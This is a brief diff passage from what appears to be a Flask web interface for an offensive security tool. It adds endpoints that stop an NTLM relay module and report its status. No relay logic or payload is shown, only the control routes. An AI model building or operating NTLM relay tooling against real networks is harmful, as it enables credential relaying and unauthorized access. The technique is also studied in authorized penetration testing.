+        return jsonify({"error": err, **ntlm_relay.status()}), 400
+    return jsonify(ntlm_relay.status())
+
+
+@app.route("/api/relay/stop", methods=["POST"])
+def api_relay_stop():
+    ntlm_relay.stop()
+    return jsonify(ntlm_relay.status())
+
+
+@app.route("/api/relay/status")
+def api_relay_status():
+    return jsonify(ntlm_relay.status())
 
 
 @app.route("/api/live/start", methods=["POST"])
